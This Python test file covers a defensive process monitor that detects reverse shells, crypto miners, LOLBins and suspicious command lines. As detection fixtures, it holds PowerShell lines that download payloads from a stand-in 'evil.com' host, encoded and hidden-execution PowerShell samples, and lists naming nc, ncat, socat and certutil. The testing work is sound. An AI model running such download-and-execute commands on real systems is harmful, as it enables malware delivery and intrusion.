"""Tests for the AEGIS Process Monitor (Priority 3, 4)."""

import pytest

# Need psutil for full tests; skip module if unavailable
try:
    import psutil  # noqa: F401
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False


class TestReverseShellDetection:
    """Tests for reverse shell detection logic."""

    def test_scripting_processes_detectable(self):
        scripting = ["powershell", "cmd.exe", "bash", "sh", "python", "nc", "ncat", "socat"]
        non_scripting = ["notepad.exe", "calc.exe", "explorer.exe"]
        for name in scripting:
            assert any(s in name.lower() for s in scripting), f"Failed to detect {name}"
        for name in non_scripting:
            assert not any(s in name.lower() for s in scripting), f"False positive on {name}"

    def test_suspicious_directory_content(self):
        from config import SUSPICIOUS_DIRECTORIES
        assert any(d for d in SUSPICIOUS_DIRECTORIES if "/tmp/" in d), "Missing /tmp/"
        assert any(d for d in SUSPICIOUS_DIRECTORIES if "/dev/shm/" in d), "Missing /dev/shm/"
        assert any(d for d in SUSPICIOUS_DIRECTORIES if "/var/tmp/" in d), "Missing /var/tmp/"


class TestCryptoMinerDetection:
    """Tests for crypto miner detection logic."""

    def test_miner_cpu_threshold(self):
        from config import MINER_CPU_THRESHOLD
        assert MINER_CPU_THRESHOLD == 50

    def test_miner_samples(self):
        from config import MINER_CPU_SAMPLES
        assert MINER_CPU_SAMPLES == 3


class TestSuspiciousCmdlineDetection:
    """Tests for suspicious command-line pattern detection (Priority 4)."""

    def test_encoded_powershell_detected(self):
        from config import SUSPICIOUS_CMDLINE_SUBSTRINGS
        patterns = SUSPICIOUS_CMDLINE_SUBSTRINGS["encoded_powershell"]["patterns"]
        cmdline = "powershell -enc SQBFAFgA"
        assert any(p in cmdline.lower() for p in patterns), \
            f"Failed to detect -enc in: {cmdline}"

    def test_hidden_execution_detected(self):
        from config import SUSPICIOUS_CMDLINE_SUBSTRINGS
        patterns = SUSPICIOUS_CMDLINE_SUBSTRINGS["hidden_execution"]["patterns"]
        cmdline = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass"
        assert any(p in cmdline.lower() for p in patterns), \
            f"Failed to detect hidden execution in: {cmdline}"

    def test_powershell_encoded_detected(self):
        """Test that base64 encoded PowerShell is detected via multiple patterns."""
        from config import SUSPICIOUS_CMDLINE_SUBSTRINGS
        encoded_patterns = SUSPICIOUS_CMDLINE_SUBSTRINGS["encoded_powershell"]["patterns"]
        cmdline = "powershell -enc SQBFAFgA"
        assert any(p in cmdline.lower() for p in encoded_patterns), \
            f"No pattern matched in: {cmdline}"

    def test_remote_download_iex_detected(self):
        """Test iex (Invoke-Expression) pattern for remote download detection."""
        from config import SUSPICIOUS_CMDLINE_SUBSTRINGS
        patterns = SUSPICIOUS_CMDLINE_SUBSTRINGS["remote_download"]["patterns"]
        cmdline = "powershell iex (New-Object Net.WebClient).DownloadString('http://evil.com/payload')"
        assert any(p in cmdline.lower() for p in patterns), \
            f"No pattern matched in: {cmdline}"

    def test_iwr_detected(self):
        """Test Invoke-WebRequest pattern."""
        from config import SUSPICIOUS_CMDLINE_SUBSTRINGS
        patterns = SUSPICIOUS_CMDLINE_SUBSTRINGS["remote_download"]["patterns"]
        cmdline = "powershell iwr http://evil.com/payload -OutFile evil.exe"
        assert any(p in cmdline.lower() for p in patterns), \
            f"No pattern matched in: {cmdline}"

    def test_normal_command_not_flagged(self):
        from config import SUSPICIOUS_CMDLINE_SUBSTRINGS
        all_patterns = []
        for group in SUSPICIOUS_CMDLINE_SUBSTRINGS.values():
            all_patterns.extend(group["patterns"])
        cmdline = "notepad.exe document.txt"
        assert not any(p in cmdline.lower() for p in all_patterns), \
            "False positive on normal command"

    def test_lolbins_list_contains_expected(self):
        from config import LOLBINS
        expected = ["regsvr32", "rundll32", "certutil", "mshta", "bitsadmin"]
        for name in expected:
            assert name in LOLBINS, f"Missing {name} in LOLBINS"
        assert len(LOLBINS) >= 10


class TestSuspiciousChains:
    """Tests for suspicious process chain detection."""

    def test_suspicious_chain_word_to_powershell(self):
        from modules.process_monitor import ProcessReasoningEngine
        engine = ProcessReasoningEngine()
        assert engine._is_suspicious_chain("word.exe", "powershell.exe"), \
            "word.exe -> powershell.exe should be suspicious"

    def test_normal_chain_not_suspicious(self):
        from modules.process_monitor import ProcessReasoningEngine
        engine = ProcessReasoningEngine()
        assert not engine._is_suspicious_chain("explorer.exe", "cmd.exe"), \
            "explorer.exe -> cmd.exe should NOT be suspicious"

    def test_normal_chain_explorer_to_powershell(self):
        from modules.process_monitor import ProcessReasoningEngine
        engine = ProcessReasoningEngine()
        assert not engine._is_suspicious_chain("explorer.exe", "powershell.exe"), \
            "explorer.exe -> powershell.exe should NOT be suspicious (KNOWN_GOOD)"


class TestSuspiciousProcessNames:
    """Tests for suspicious process name detection."""

    def test_suspicious_names_listed(self):
        from config import SUSPICIOUS_PROCESS_NAMES
        expected = ["powershell", "cmd.exe", "wscript", "mshta", "certutil"]
        for name in expected:
            assert name in SUSPICIOUS_PROCESS_NAMES, f"Missing {name}"
        assert len(SUSPICIOUS_PROCESS_NAMES) >= 10


@pytest.mark.skipif(not PSUTIL_AVAILABLE, reason="psutil not installed")
class TestProcessMonitorInstantiation:
    """Tests for ProcessMonitor creation and lifecycle."""

    def test_instantiation(self):
        from modules.process_monitor import ProcessMonitor
        monitor = ProcessMonitor()
        assert monitor is not None
        assert not monitor._running

    def test_start_stop(self):
        from modules.process_monitor import ProcessMonitor
        monitor = ProcessMonitor()
        monitor.start()
        assert monitor._running
        monitor.stop()
        assert not monitor._running


class TestProcessReasoningEngine:
    """Tests for the ProcessReasoningEngine without psutil."""

    def test_suspicious_dir_check(self):
        from modules.process_monitor import ProcessReasoningEngine
        engine = ProcessReasoningEngine()
        assert engine._is_in_suspicious_dir("/tmp/malware.exe", "/tmp"), \
            "Should detect /tmp/ as suspicious"
        assert not engine._is_in_suspicious_dir("/usr/bin/python3", "/home/user"), \
            "/usr/bin should not be suspicious"

    def test_suspicious_cmdline_groups_have_required_keys(self):
        from config import SUSPICIOUS_CMDLINE_SUBSTRINGS
        for name, cfg in SUSPICIOUS_CMDLINE_SUBSTRINGS.items():
            assert "patterns" in cfg, f"{name} missing patterns"
            assert "risk" in cfg, f"{name} missing risk"
            assert cfg["risk"] in ("LOW", "MEDIUM", "HIGH", "CRITICAL"), \
                f"{name} has invalid risk level"
            assert len(cfg["patterns"]) > 0, f"{name} has empty patterns"


class TestNoNetProcesses:
    """Tests for processes that should never have network connections."""

    def test_no_net_processes_listed(self):
        from config import NO_NET_PROCESSES
        assert "notepad.exe" in NO_NET_PROCESSES
        assert "calc.exe" in NO_NET_PROCESSES
